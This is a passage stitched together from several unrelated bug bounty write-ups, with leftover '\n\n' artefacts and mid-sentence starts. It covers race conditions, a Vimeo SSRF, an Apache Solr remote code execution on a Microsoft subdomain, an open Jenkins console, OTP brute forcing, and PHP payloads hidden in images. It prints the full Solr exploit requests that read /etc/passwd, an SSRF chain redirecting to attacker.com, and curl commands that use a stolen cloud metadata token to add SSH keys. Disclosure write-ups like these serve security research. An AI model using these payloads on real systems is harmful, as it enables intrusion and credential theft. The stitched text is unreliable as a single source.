satisfying . Why will the victim commit mistake in filling the form . The scenario is too much dependent on the victim . If the victim does not commit mistake the attacker will not be able to see the pre-filled form . Damn !! So I had to find a way that was not depended on the error . I spend the next couple of hours in finding a way . I tried CSRF to force the victim to generate error . But that was stupid as I was the only one who was giving the pre-filled information . After some hit and trail my mind poped up with a strange Idea !!! Enter the Race Condition : What would be the server’s reaction if instead of doing a manual browser refresh at the attacker’s end multiple times I do it in burp intruder with a good amount of threads . So I took the Checkout URL and Fired up Burp Intruder and began intruding with NULL payloads . (100 Threads) . Meanwhile I filed up the form at the victim’s end and hit Submit button . I was eagerly waiting for something to happen at the intruder’s end and ….. Press enter or click to view image in full size We got a different response length just after submitting the URL at the intruder’s end . The response after goes to 3xx which depicts that the checkout has been done and its moving to the final page . Now lets see what have I got here in the response . Press enter or click to view image in full size Yesssssss !!! The CC number got leaked in the response !!!!!!!! Just to add this response has all the details that the victim has entered . :) I just made a Dirty diagram that would help in understanding the issue better ( yeah its dirty , I’ve been writing for so long :( ) : Press enter or click to view image in full size As you can see that the The attacker began requesting the response of the checkout URL in an extremely fast multi threaded manner . As soon as the victim submits full details to the server the server caches the details and inadvertently gives the response to the attacker (that the attacker has been requesting in a multi threaded manner)that has all the information of the form . So before going to the next page (3xx) , the response is sent to the checkout URL requester (Attacker) without the need of any error . That was pretty much all of it . See you guys . Take care .

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRace conditions on the web - Josip Franjković Josip Franjković web security consultant Blog Bug bounties Race conditions on the web written on July 12th, 2016 The goal of this blog post is to raise awareness about race condition attacks in both developers and security people, because I feel like not many know about this kind of bug - I have participated in CTFs whose points system was vulnerable to race conditions (even Facebook’s CTF platform was ). All examples I wrote about were found in public bug bounty programs and are fixed. At the bottom of the page is a compilation of tools and posts for further reading. Enjoy! Stealing BitCoin from Cobalt.io Cobalt is a bug bounty platform that offers payouts in BitCoin and PayPal. Their BitCoin withdrawal flow was vulnerable to a race condition attack which could be used to withdraw one bounty multiple times. Check out the original report here: https://cobalt.io/cobalt/cobalt/reports/587 Confirming any unused email address on Facebook This was an unusual race condition which could be exploited to confirm any unused email address on Facebook. During February, I was testing the mobile registration flow on Facebook, and somehow succeeded to confirm a random email address. I reported this to Facebook hoping they’d be able to debug it, since I did not understand how it happened, and made ~5000 requests before realizing the email was confirmed. On April 20th I re-tested the flow and finally got reliable proof of concept: Register a new account, but do not confirm the email or phone Obtain a Facebook-issued access_token for the new account Create multiple requests at the same time to api.facebook.com/method/user.editregistrationcontactpoint while changing the add_contactpoint POST parameter you should change add_contactpoint between an email you have access to, and one you do not, for example [email protected] and [email protected] On [email protected] you will receive a confirmation link that will look like this: / [email protected] & c= 13475& code= 84751 The GET parameter “c” is always the code for your email address, but the “code” parameter confirms the one you do not have acces to ( [email protected] ). After obtaining the code, you can go to Facebook settings and confirm the email. The bug was fixed on May 10th, 2016, and is my favorite report to Facebook. Adding multiple single-use coupons to one Facebook ad account During the final three months of 2014, Facebook announced they’d be giving double bounties for any ads-related bugs, so I started poking around and found a (minor) bug in how they handled ad coupons. Some coupons can be used only once, and a single ads account should be able to redeem only one ad coupon. Using race conditions, I could add multiple ad coupons to a single account. Bear in mind that this bug did not enable me to re-use single coupon multiple times or on different accounts. To exploit this bug, you would need to buy a couple ad coupons, and try to redeem them at the same time on one account. Multiple coupons would then be available for you to spend, which obviously breaks the one coupon per account rule. The interesting thing about this report is the timeline: October 20, 2014: Bug reported to Facebook October 22, 2014: Facebook is looking into the issue December 2014: Many messages back and forth between Facebook and me; they were not able to reproduce this issue. I was at fault here, because the steps were not clearly explained in my report. Looking back, I should have attached my POST requests and server responses for easier analysis. February 13, 2015: Update from Facebook, they still are not able to reproduce this, but have checked the code and believe vulnerability is present. Facebook apologizes for the high latency so far. April 22, 2015: Facebook still not able to reproduce it. They ask me if the bug is still present. I have no way to buy coupon codes, and inform Facebook it is impossible for me to re-test it. At this point I gave up on the report because there was no way for me to prove the vulnerability, and Facebook had no luck reproducing it. But… September 23, 2015: Facebook informs me they have fixed the bug, and ask me to confirm it September 24, 2015: After a lot of Googling I get my hands on a couple coupon codes, and try out the race condition. It is now fixed. A couple days later, Facebook closed the report: I think this bug is not worth $7500, so I asked Facebook for an explanation of the bounty. Their reply: Mega.nz coupons and purchasing race conditions Mega was vulnerable to a coupons reuse race condition, very similar to one I found in DigitalOcean ( writeup ). The other bug was present in the purchasing logic. When you purchase Mega premium, a request is made to their API server eu.api.mega.co.nz/cs , which lowers balance and adds premium time. By sending multiple requests you could buy the premium multiple times, while your balance would go to negative values - this was not an intended functionality. Mega rewarded me with a 250EUR bounty, which I told them to donate to LetsEncrypt. Cheating Keybase invites system First bug was present when generating invites for different emails. Let us assume you have 1 invite on your Keybase account. You could bypass the invitation limit by sending a bunch of POST requests with different email values to an API endpoint. Original report with the steps: https://hackerone.com/reports/115007 Couple months later I saw Keybase re-designed the system, and tried the same attack. It did not work, but a new bug was introduced to the registration flow, using which you could register multiple users while redeeming one invite.

Harsh Jaiswal 4 min read · Mar 8, 2019 -- 7 Listen Share Recently I discovered a semi responded SSRF on Vimeo with code execution possibility. This blog post explains how I found & exploited it. So let's get started. Background. Vimeo provides an API console for their API called API Playground , The requests made using this web app is done from server-side. Take the bellow request as an example. Press enter or click to view image in full size Base request This request is supposed to make a server-side GET request to https://api.vimeo.com/users/{user_id}/videos/{video_id} If you look closely to the request we control quite of things here, First the uri parameter which is the endpoint to hit on endpoint i.e. in this case is /users/{user_id}/videos/{video_id} , Request method i.e., in this case, is set to GET , params which are supposed to be post parameters if the request method is POST. user_id & video_id are kind of variables whose values gets defined in segments parameter. Path traversal in HTTP requests made on server side. I first tried to change URI parameter to my custom path however any change in URI will result in a 403, Means that they’re allowing a set of API endpoints. However, changing the value of variables such as user_id & videos_id is possible because they’re intentional and because these values reflect in the path of URL. Passing ../../../ will result in a request to ROOT of api.vimeo.com Below is what happens. URL.parse(“https://api.vimeo.com/users/1122/videos/../../../attacker”) Result: https://api.vimeo.com/attacker Press enter or click to view image in full size Path traversal in HTTP requests made on server side As you can see in response all endpoints of api.vimeo.com is listed which is root response of api.vimeo.com if you make an authenticated request (with authorization header). What now? We’re still on api.vimeo.com host, how do we escape it? Well, I figured that this is following HTTP 30X redirects, Its a long story took a Lil bit of logical thinking. Back to the point, Now I know this is following HTTP redirects and we’re good to move forward, We need an open redirect so that we can redirect server to our controlled asset. The good old content discovery… A minute of content discovery and I came across an endpoint on api.vimeo.com which makes a redirection to vimeo.com with our controlled path on vimeo.com https://api.vimeo.com/m/something Press enter or click to view image in full size api.vimeo.com to vimeo.com Cool, Now we have a wide scope to find an open redirect, I have a not very useful open redirect on vimeo.com, I won't be disclosing its details but let's just assume it is something like this https://vimeo/vulnerable/open/redirect?url=https://attacker.com This makes a 302 redirect to attacker.com, Chain completed to redirect to attacker asset.. The final payload to redirect the server to our controlled asset is ../../../m/vulnerable/open/redirect?url=https://attacker.com Passing this value inside video_id will parse URL in this way https://api.vimeo.com/users/1122/videos/../../../m/vulnerable/open/redirect?url=https://attacker.com Which on parsing becomes https://api.vimeo.com/m/vulnerable/open/redirect?url=https://attacker.com HTTP redirection made & followed to https://vimeo.com/vulnerable/open/redirect?url=https://attacker.com Another HTTP redirection made & followed to https://attacker.com Press enter or click to view image in full size SSRF Achieved, Redacted details regarding the open redirect and my domain. The server expects a JSON response and parses it and shows in response. Exploiting.. As Vimeo infrastructure is on Google cloud, My first attempt was to hit the Google metadata API. I followed the approach taken by André Baptista (0xacb) This endpoint gives us service account token. http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token ?alt=json { “headers”: [ “HTTP/1.1 200”, “Content-Type: application/json”, “Host: api.vimeo.com” ], “code”: 200, “body”: { “access_token”: “ya29.c.EmKeBq9XXDWtXXXXXXXXecIkeR0dFkGT0rJSA”, “expires_in”: 2631, “token_type”: “Bearer” } } Scope of token $ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA Response: { \"issued_to\": \"101302079XXXXX\", \"audience\": \"10130207XXXXX\", \"scope\": \"https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring\", \"expires_in\": 2443, \"access_type\": \"offline\" } I could then use this token to add my public SSH key to the instance and then connect via my private key $ curl -X POST “https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata\" -H “Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA” -H “Content-Type: application/json” — data ‘{“items”: [{“key”: “harsh-bugdiscloseguys”, “value”: “harsh-ssrf”}]} Response: { “kind”: “compute#operation”, “id”: “63228127XXXXXX”, “name”: “operation-XXXXXXXXXXXXXXXXXX”, “operationType”: “compute.projects.setCommonInstanceMetadata”, “targetLink”: “https://www.googleapis.com/compute/v1/projects/vimeo-XXXXX\", “targetId”: “10423XXXXXXXX”, “status”: “RUNNING”, “user”: “10423XXXXXXXX-compute@developer.gserviceaccount.com”, “progress”: 0, “insertTime”: “2019–01–27T15:50:11.598–08:00”, “startTime”: “2019–01–27T15:50:11.599–08:00”, “selfLink”: “https://www.googleapis.com/compute/v1/projects/vimeo-XXXXX/global/operations/operation-XXXXXX\"} And… Press enter or click to view image in full size keys added Press enter or click to view image in full size *Le me However, SSH port was open on the internal network only :(( but this was enough to prove that internally this can be escalated to shell access. Kubernetes keys were also extracted from metadata API, but for some reason, I was not able to use them, Although the Vimeo team did confirm they were valid. Due to my work & involvement with Vimeo, I was allowed to go deeper than would normally have been allowed. That’s it, folks. I hope you liked this. Share/Re-Tweet is much appreciated, Have any questions regarding this? DM @ rootxharsh Thanks to; Vimeo team for allowing disclosure of this issue.

Here’s the full content:\n\nJosip Franjković - archived security blog: Race conditions on Facebook, DigitalOcean and others (fixed) Josip Franjković - archived security blog Monday, 27 April 2015 Race conditions on Facebook, DigitalOcean and others (fixed) Hello, Lately I have been looking into race condition bugs affecting websites/web-applications. Here is a good resource to learn about them - includes theory, vulnerable code, proof of concept code and ways to fix. I highly recommend you read it: https://defuse.ca/race-conditions-in-web-applications.htm Below are couple of my reports ranging from benign to pretty high severity. Facebook bug 1: inflating page reviews using a single account. Some Facebook pages have a review system, where you can rate the page 1-5 stars and add textual description. Each user is allowed to rate only once, and you can edit or delete your review later. Using race conditions you could rate a page multiple times, then delete one of your reviews, and then rate again. This allowed me to inflate or deflate ratings of any page. Here is my report to Facebook, slightly edited: Using your account go to Page URL and add a review with 5 stars, but intercept the /ajax/pages/review/add request Send out as many /ajax/pages/review/add requests as you can in shortest possible time frame. The reviews will jump to some number > 1 (depending on luck and how much requests you sent), lets say it is 5 reviews. Go to Page once again, and go to All reviews. Delete the one review by you (only one rating will be deleted). Now page has 4 reviews Create a new review with same user, and repeat steps 1-6. You now have a really well-rated Page. Report timeline: April 14, 2014 - Bug reported to Facebook April 15, 2014 - Confirmation from Facebook's security team April 27, 2014 - Pinged Facebook team thinking this was fixed, but it was not :-) June 15, 2014 - Bug is now fixed I believe this was one of first race condition bugs reported to Facebook, as I found no other write-ups online, and this is what Facebook's team told me: \"Out of curiosity, has anyone reported any similar bugs to this one - some kind of race condition? \" - not recently. In the past they may have, but I cannot tell for sure. Facebook bug 2: creating multiple usernames for a single account The principle behind this bug is same as previous one; send as many requests to an endpoint with a list of wanted usernames. Some will go through, others will not. Here is my test account with two usernames: https://graph.facebook.com/rpert.grint.6 https://graph.facebook.com/rpert.grint.7 This bug was fixed, but a bounty was not awarded. Here is the original reply from Facebook: The issue you describe is not a security issue. Reporting this issue is not eligible for a bug-bounty. However, we have made changes to the codebase and the issue should no longer be present. Report timeline: April 14, 2014 - Bug reported to Facebook October 16, 2014 - Confirmation of fix There are some more minor bugs that I have found, but none of them have a real security impact, so I did not report them. I have one more race condition bug reported to Facebook, but Facebook team had trouble reproducing it. I will edit the write-up when/if it gets fixed. DigitalOcean bug: making money out of thin air This was a fun one. Basically, I reused one promo code multiple times using race conditions. Here is the report: Create an account and find a working promo code Go to your billing management page Paste your promo code into input field A POST request to https://cloud.digitalocean.com/promos will be made. Send this POST request many times in short time frame - best to multithread it. Money will be added multiple times to your account. Report timeline: January 11, 2015 - DigitalOcean security contacted with a report January 13, 2015 - Confirmation from DigitalOcean team January 21, 2015 - Bug is fixed. At the time of report I did not have a $100 promo code from GitHub's education pack, but I believe it would get redeemed multiple times, too. I did not get a separate bounty for this report, but DigitalOcean team let me keep my test accounts with ~550$ total. Here is a screenshot from one of accounts where codes have been redeemed multiple times. Unfortunately, I lost email for this account... Similar promo code race conditions were reported to many other companies, with LastPass team being fastest to fix the issue - it only took them 3 days. They have also let me keep the premium time on my account, and confirmed no-one abused the bug prior to my report. I'd like to thank Facebook, DigitalOcean and LastPass security teams for being responsive to my reports, and rewarding me for them! Giant thanks to Team Tasteless, too.

The vulnerability is race condition . Background Just to give a brief background about what actually a race condition is . A race condition occurs when multiple threads simultaneously access the same shared code/resource without locking or synchronization . This may result in inconsistency of the output. While developing the application the developer things that the concurrency is managed by the server itself while the server guys think that the devs would be responsible for dealing with concureent thread execution . So its like a typical IT company situation . 😁 Following diagram shows the execution of processes over the same shared resource . Source : https://securingtomorrow.mcafee.com/technical-how-to/testing-race-conditions-web-applications/ A theoretical example Citing a race condition example directly from Owasp Race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of other events. In a web application environment, where multiple requests can be processed at a given time, developers may leave concurrency to be handled by the framework, server, or programming language. The following simplified example illustrates a potential concurrency problem in a transaction web application and relates to a joint savings account in which both users (threads) are logged into the same account and attempting a transfer. Account A has 100 credits. Account B has 100 credits. Both User 1 and User 2 want to transfer 10 credits from Account A to Account B. If the transaction was correct the outcome should be: Account A has 80 credits. Account B has 120 credits. However, due to concurrency issues, the following result could be obtained: User 1 checks the value of Account A (=100 credits) User 2 checks the value of Account A (=100 credits) User 2 takes 10 credits from Account A (=90 credits) and put it in Account B (=110 credits) User 1 takes 10 credits from Account A (Still believed to contain 100 credits) (=90 credits) and puts it into Account B (=120 credits). Result: Account A has 90 credits. Account B has 120 credits. Bug That I found While there were many race condition bugs that I found which were pretty straight forward to exploit but I would be discussing about one specific bug that would give you an overview as to where to search for these kinda bugs and what all techniques you can use if you are haulted somewhere . Accessing multiple consoles by free user So there was this site that provides free consoles to the users and some limited space and bandwidth . It had 3 tiers of accounts . A free account , and 2 paid accounts having different set of benefits . One restriction of the free account was the no. of consoles the user can create . It was limited to 2 consoles / user . When you create a console a get request to the creation of the console was sent .At seeing this i thought would it be possible for the attacker to bypass this limited no. of consoles . I fired up the intruder with maximum possible no. of threads and started to intrude the GET request (Using Null payloads ) to see what the server will behave . Unfortunately this didn’t worked well . I was getting valid response for the first two requests . Then after that I started getting fixed length responses saying that the console limit is reached . Limit Reached Now the problem with race condition bugs is that its not executed in one go . It depends on various types of factors like current no. of threads on the server , the load on the server , your own internet speed and other factors . I tried shooting that request multiple times with over 100 threads but I got the same reply from the server . (Only two consoles were created ) . Then I tried the following workaround : I tried simulating the same attack but this time I removed one of the console manually from the UI while the threads were being executed . As you can see in the following screenshot that 3 requests got the same response . So we successfully bypassed the console limit of the free account . 3 Requests executed Finally Success So the key factors that are to be kept in mind are: Race condition bugs are mostly on those endpoints which deal with adding/removing/changing of a particular resource . They may /may not be replicated on one go . Try again and again . The best use case is to test is by executing parallel threads and making changes on the particular resource at the same time . There are higher chances you can get it executed . Ideally you should shoot up 100+ threads (If you are testing in burp). Thanks for reading !

Hacking Banks With Race Conditions How race conditions compromise the security of financial sites Vickie Li 6 min read · Feb 27, 2020 -- 1 Listen Share Press enter or click to view image in full size Photo by Victoire Joncheray on Unsplash One of the biggest threats to modern online banking is a type of vulnerability called race conditions. These vulnerabilities stem from simple programming mistakes that developers commonly make. And these mistakes have proved costly: race conditions have been used by hackers to steal money from online banks, stock brokerages, and cryptocurrency exchanges. (They have also been used by hackers to drink unlimited coffee at Starbucks, as you’ll soon see in this post!) Today, let’s talk about how and why these vulnerabilities happen, how attackers have exploited it, and how to prevent it in your own applications. Crash Course Concurrency In computer science, concurrency is the ability for different parts of a program to be executed simultaneously without affecting the final outcome of the computation. When a program is developed with concurrency in mind, it can take full advantage of modern multithreading and multiprocessing systems, and thus drastically improve its performance. Multithreading is the ability of a CPU to provide multiple threads of execution. These threads don’t all execute at the same time but take turns using the CPU’s computational power. With multithreading, other threads can continue taking advantage of the unused computing resources while they are idle. (For example, when the original thread is suspended while waiting for input or output to complete.) While multiprocessing refers to the usage of multiple CPUs for computation at the same time. Arranging the sequence of execution of multiple threads is called scheduling. There are many different scheduling algorithms in use, each optimized for different performance priorities. What is a Race Condition? In computing, a race condition happens when two sections of code that are designed to be executed in a sequence were executed out of sequence. Since the scheduling algorithm can swap between the execution of two threads at any time, you can’t predict the sequence in which the threads execute each action. For example, let’s say that two concurrent threads of execution are each trying to increase the value of a global variable by 1. So in the end, the global variable will have the value of 2. (The example is taken from the Wikipedia page: https://en.wikipedia.org/wiki/Race_condition ) Ideally, the threads would be executed as such: But, if the two threads are run simultaneously, without resource locks (a mechanism that blocks other threads from operating on the same resource) or synchronization (a mechanism that ensures that threads that utilize the same resources so not execute simultaneously), the execution could be scheduled like this: Press enter or click to view image in full size In this case, the final value of the global variable becomes 1, which is incorrect. (The expected value is 2.) This happens because the outcome of the execution of one thread depends on the outcome of another thread. When the two threads are executed simultaneously, unexpected outcomes can occur. What is a Race Condition Vulnerability? A race condition becomes a vulnerability when it affects a security control mechanism. Hackers can then induce a situation in which a sensitive action is executed before a security control is complete. For this reason, race condition vulnerabilities are also referred to as Time of Check/Time of Use vulnerabilities . Imagine if the two threads of the above example are executing something a little more sensitive: the transferring of money between bank accounts. The application would have to perform three subtasks to transfer the money correctly: Check if account A has enough balance. Add the money to account B. Deduct the money from account A. Let’s say that you own two bank accounts, account A and account B . You have $500 in account A and $0 in account B. Now, you initiate two money transfers of $500 from account A to account B. Ideally, when two money transfer requests were initiated, the program should behave like this. Press enter or click to view image in full size But if you can send the two request simultaneously, you might be able to induce a situation in which the execution of the threads become like this: Press enter or click to view image in full size Note that in this scenario, you end up with more money than you started with! You essentially made an additional $500 appear out of thin air by exploiting a race condition vulnerability. Case Study: Unlimited Starbucks Coffee A cool example of how race conditions have been exploited in real life was the Starbucks hack by security researcher Egor Homakov. By exploiting a race condition on the gift card page, he found a way to generate an unlimited amount of credit on Starbucks gift cards for free. This vulnerability lies in the functionality that transfers the gift card balance from one card to another. The website uses the following POST request to transfer credit: POST /step1?amount=5&from=card_A&to=card_B When this request is sent multiple times within a small time frame, the hacker can induce a situation in which he can transfer more money into card B than the account balance that he has on card A. This means that when executed for many times, this attack generates unlimited amounts of money on card B for free. The root cause of this attack is a race condition between these three actions: Check that card A has enough money to be transferred. Transfer that amount to card B. Deduct the balance of card A. This is the breakdown of the race condition that caused the vulnerability: Press enter or click to view image in full size You can read more about the fun details of the exploit here. Hacking Starbucks for unlimited coffee This is a story about how I found a way to generate unlimited amount of money on Starbucks gift cards to get life-time… sakurity.com High-Risk Applications Race conditions are used as a way to subvert access controls. So in theory, any application that has sensitive actions that rely on access control mechanisms could be vulnerable. Most of the time though, hackers target race conditions on the websites of financial institutions. Because if a race condition could be found on a critical functionality like cash withdrawal, fund transfer or credit card payment, it could lead to infinite financial gains for the hacker. Other high-risk applications include e-commerce sites, online games, and online voting systems. Additionally, if an exploitable race condition was ever found on a site, it is possible that the site does not follow secure programming practices and thus the likelihood of it being vulnerable again is high. Exploiting Race Conditions Most of the time, you can test for and exploit race conditions in web apps by sending multiple requests to the server simultaneously. Bank Account balance: 3000 For example, if you want to see if you can withdraw more money than you have in your bank account, you can simultaneously send multiple requests for withdrawal to the server via the curl command. curl (withdraw 3000) & (withdraw 3000) & (withdraw 3000) & (withdraw 3000) & (withdraw 3000) & (withdraw 3000) Note that whether your attack succeeds or not would depend on the process scheduling algorithm of the server and is a matter of luck. However, the more requests you send within a short time frame, the better the odds that your attack will succeed. Preventing Race Conditions The key to preventing race conditions is to implement safe concurrency. And the best way to do this is by using resource locks. Most programming languages that have concurrency abilities will also have some sort of locking functionality built-in. Please refer to the documentation of your chosen language to learn how to do it! Beyond that, following secure coding practices (like the least privilege principle) and auditing code on a regular basis will reduce the likelihood of your application being hacked! Thanks for reading. And remember: trying this on systems where you don’t have permission to test is illegal. If you’ve found a vulnerability, please disclose it responsibly to the vendor.

I’ll try to be as simple as possible. Participated in Microsoft Bug Bounty Program first time.. About the RCE: While doing some recon on microsoft.com website i found a subdomain http://tide90.microsoft.com/ doing a basic port scan using nmap (nmap -A tide90.microsoft.com ) Showed that port 8983 was open and running Apache Solr, Normally companies run Apache Solr Admin dashboard behind there VPN or is protected by a Login, but on Microsoft it wasn’t protected at all thus just going to http://tide90.microsoft.com:8983/ Took me to Admin Dashboard. Apache Solr versions 5.0.0 to 8.3.1 are affected by this vulnuberilty CVE-2019-17558 , To get an RCE on vulnuberal Apache Solr instance you need to trigger it in two steps. First, the attacker needs to modify the “ params.Resource.Loader.Enabled ” configuration item to True through the config API. Sending the Following POST request modified the value POST /solr/ZigmaCore/config HTTP/1.1 Host: tide90.microsoft.com:8983 User-Agent: Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 261 { “update-queryresponsewriter”: { “startup”: “lazy”, “name”: “velocity”, “class”: “solr.VelocityResponseWriter”, “template.base.dir”: “”, “solr.resource.loader.enabled”: “true”, “params.resource.loader.enabled”: “true” } } Then complete the vulnerability trigger by sending a malicious velocity template via GET request with custom velocity template parameter in a specially crafted Solr request, leading to RCE GET /solr/dovecot/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27) +%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27)) +%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/etc/passwd%27)) +$ex.waitFor()+%23set($out=$ex.getInputStream()) +%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1 Host: tide90.microsoft.com:8983 User-Agent: Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 0 That’s all to get an RCE on microsoft.com subdomain, you can read more on it via following the CVE ID, Reviews about Microsoft Bug Bounty Program: I won’t really suggest participating in Microsoft Bug Bounty if you’re going for web assets Bounty as it’s kinda confusing when it comes to scope and no bounties for most of it..

Easy answer: higher severity, less time! As usual, I was looking for random servers on Shodan , owned by a company which had a bug bounty program that I was targeting. After a while I came across a few Jenkins instances which were in-scope. The first one was pretty boring, it seemed up-to-date and there were no public exploits that could have been useful. The second instance, though, was much more interesting. Although it was up-to-date as well, just like the previous one, there was a link to create new accounts in the login screen. It looked like this: At this point I tried to sign up and it worked flawlessly. After logging in, I was able to see everything: usernames, build history and so on. I could have reported this finding by now, but since in Jenkins there’s an easy way to run commands on the server I had to try it! To do that, I went to jenkins-subdomain.redacted.com/script. Here there was a console where I could write commands and execute them: Press enter or click to view image in full size In the picture above you can see the output of the ls command ( “ls /”.execute().text ), which returned as output the folders in the server’s root directory. RCE! Lessons learned You may be wondering how a company running a bug bounty program could let a Jenkins instance misconfigured in such a bad way. In this case, I believe that the developer who installed Jenkins thought that running it on a non-standard port was enough to hide it from the whole internet. Unfortunately for him, search engines like Shodan have proved that’s a faulty assumption which should never be made: security by obscurity never worked, and never will.

May be in a future there will be more terrible things. But not now. This is more instruction to action. Often, what you do not use is very quickly forgotten. So here I decided to write something to remember and share with you. So what does it mean — race condition? It’s very common bug for websites with balances, vouchers or other limited resources (mostly money). A race condition occurs when multiple threads simultaneously access the same shared code, variables, files, etc. without locking or synchronization, resulting in inconsistency of the output. Just imagine that you can transfer your money from one account to another without loosing money from first account. And yes, it's not a joke. It's real. For example some years ago Egor Homakov has published story about race condition in Starbucks Caffe. He posted his story here . It's insane. As he said: \"I could create a simple bunch of fake gift cards bought around the world, silently generate credits on them and sell Starbucks credits online for Bitcoin with, say, 50% discount. It would easily make me a couple of millions of dollars unless Starbucks actually tracks gift card balances.\" How can we check it? Usually I use a Burp Suit. Here a couple of screenshot how to. Catch you request with Burp Suit Proxy. And with context menu Send to Intruder this request . Press enter or click to view image in full size 2. Go to Options menu. Here we choose number of threads: 25 . It's better to use 25 (the default value is five) because we want to send many simultaneous requests. 3. Go to Payloads menu. Here we should use Payload type: Null payloads , because we are going to replay the request as it is. And after this simple steps we can start the intruder attack and observe the results. Simple actions — great consequences.

This attack is very similar to https://thehackernews.com/2016/03/hack-facebook-account.html only difference is that the attack was on the login functionality itself . Login mechanism : Enter the mobile no , user receives an otp . Enter the otp and login into the webapplication. Flaw was that rate limiting was not on place and thus gave an attacker endless opportunities to brute force a 6-digit code and login into any account. Response for Valid OTP Press enter or click to view image in full size Response for Invalid Otp Press enter or click to view image in full size So , now we had two different responses for a valid and an invalid otp that were processed during the authentication process. I curiously validated in intruder if rate limiting was present or not and if it can be bypassed — just following the bug hunting strategy (doubt on everything that is in front of you). And NO RATE LIMITING even after 50 wrong attempts :) I could have exploited it in intruder , but because most of the programme handlers are not expert in information security and may/may not have idea of BurpSuite/Intruder — I decided to write up an exploit (which I always love to present things to give the enduser a fair idea on the other side that how in real world it can be exploited) Exploit Code (This was something similar-with few omitted part) Press enter or click to view image in full size Fire up the exploit and bruteforce OTP .

My first thought was to check for an SSRF vulnerability through the remote file upload feature, but I decided to start by testing the local file upload. After several tests, I found that the app only allowed image files (.jpg, .png, .gif, and .svg). The .svg format could potentially lead to XSS, but that wasn’t my focus this time. Moving on to the remote file upload feature, I intercepted a request while adding an image. The request included three POST form-data fields: name, url, and photoId. I tried changing the url to my server, but got an Internal Server Error response with no incoming connection. Removing the photoId data resulted in the same error, but this time I got an incoming connection on my server. This was likely due to the lack of a valid image file at the provided url. Next, I provided a url with a valid jpg image file, which successfully uploaded to the media library. Interestingly, when I modified the “name” form-data to image.html and image.php, both uploads were successful. I quickly realized that injecting PHP scripts into image exif metadata wouldn’t work because the app recreated the fetched image file using the PHP-GD library, which removes exif metadata. However, I found several articles suggesting that it’s still possible to inject PHP scripts into images that won’t be removed after processing. https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg fakhrizulkifli/Defeating-PHP-GD-imagecreatefromgif Developer uses GD (or Imagemagick) library in order to prevent image header script execution by recreating the image… github.com BookFresh Tricky File Upload Bypass to RCE Hello all today i'm going to write about an interesting vulnerability i've found in Square's Acquisition website… secgeek.net These methods are limited to a few characters, though. Also there is payload injector created by dlegs. dlegs/php-jpeg-injector Injects php payloads into jpeg images. Related to this post. You have a web application that runs a jpeg image through… github.com First attempt, I use dlegs tool to inject payload to .jpg image. You need to recreate a .jpg image with php-gd first then inject the payload with gd-jpeg.py $ php gd.php image.jpg image-gd.jpg Then inject the payload to image-gd.jpg $ python gd-jpeg.py image-gd.jpg ‘<?php phpinfo()?>’ image-gd-poc.jpg To make sure the injected payload working, try re-create the image-gd-poc.jpg with php-gd. $ php gd.php image-gd-poc.jpg image-gd-poc-1.jpg Then compare binary image-gd-poc.jpg and image-gd-poc-1.jpg I use vbindiff to compare both image. $ vbindiff image-gd-poc.jpg image-gd-poc-1.jpg Press enter or click to view image in full size The injector writed by dlegs will inject your provided payload into a .jpg image file. This is only working if your target app recreate the image with default quality (default -1). Unfortunately, this method failed because the target app converted images with a quality setting of 90, removing the injected payload. My next attempt used a .gif image payload by @ABOUL3LA . This time, I successfully uploaded the POC.gif file and renamed the form-data “name” to test.php, resulting in code execution. On his article he provided POC.gif image that already injected with <?phpinfo()?>. Finally, this is what I got after upload POC.gif and renaming the form-data “name” to test.php Press enter or click to view image in full size If you want to use POC.gif payload by @ABOUL3LA the target app must have short_open_tag=On set in php.ini, otherwise the php script won’t executed and you have to modify the payload with <?php ?> tag to make it work. I reported this vulnerability to the bug bounty program, and they triaged it within minutes, patching it in just a few hours. I explore bit more into the php-gd lib, just want to know how many bytes we can inject to image. After several testing on different .jpg and .gif image, I can conclude that .jpg image can be injected with payload up to 13 bytes, but .gif image could be injected with more bytes. GIF image that could be injected is GIF image that has null byte blocks. I found out that GIF images with Netscape Looping Application Extension have this null byte blocks. Netscape Looping Application Extension is the most popular Application Extension Block that tells browser or other GIF viewer to loop the entire animated GIF file. http://www.vurdalakov.net/misc/gif/netscape-looping-application-extension This is example GIF image that has Netscape Looping Application Extension https://media2.giphy.com/media/6NjZoOdEbXs1W/source.gif If we recreate the GIF image with php-gd, the null byte blocks not removed. Look at binary comparison between original gif and gd gif below. Press enter or click to view image in full size So let’s try inject php shellcode to this null byte blocks and recreate the GIF image with PHP-GD, this is the binary comparison: Press enter or click to view image in full size The injected payload remain there. Then you can upload the gif image to your vulnerable target app. Press enter or click to view image in full size You can get the GIF Injector and other scripts here: https://gist.github.com/asdqwe3124/e63eba35dc8e6976af97f1a9348b277b MRM The latest Tweets from MRM (@agamimaulana). asdqwe.

